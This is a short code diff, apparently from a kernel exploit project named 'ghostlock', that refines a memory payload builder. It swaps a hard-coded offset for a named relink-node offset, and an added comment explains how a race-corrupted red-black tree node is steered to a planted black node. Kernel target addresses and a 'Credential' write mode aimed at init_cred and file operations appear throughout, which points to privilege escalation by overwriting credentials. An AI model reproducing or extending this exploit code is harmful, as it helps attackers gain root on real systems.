@@ -1,5 +1,7 @@
 #include "memory/payload_builder.h"
 
+#include "kernel/target.h"
+
 #include <cstring>
 
 #include <algorithm>
@@ -63,9 +65,12 @@ namespace ghostlock::memory {
         if (!request || request->mode == WriteMode::Disabled) return layout;
 
         if (request->preserve_child) {
+            /* The value doubles as the node's __rb_parent_color, so a lost race
+             * walks it as a tree node: point it at the planted black node
+             * instead of the fd_set word, which is zero and therefore red. */
             layout.right = request->mode == WriteMode::Credential
                                ? init_cred_alias
-                               : page_base + 0x100;
+                               : page_base + kernel::RELINK_NODE_OFF;
         }
         if (request->mode == WriteMode::Credential) {
             layout.fops = credential_fops;
@@ -129,7 +134,7 @@ namespace ghostlock::memory {
             },
             {
                 0xffffff8000124000ULL, WriteMode::Zero, 0,
-                0xffffff8800210100ULL, 0xffffff8000124000ULL
+                0xffffff8800210200ULL, 0xffffff8000124000ULL
             },
             {
                 0xffffff8000125000ULL, WriteMode::Credential, 0,
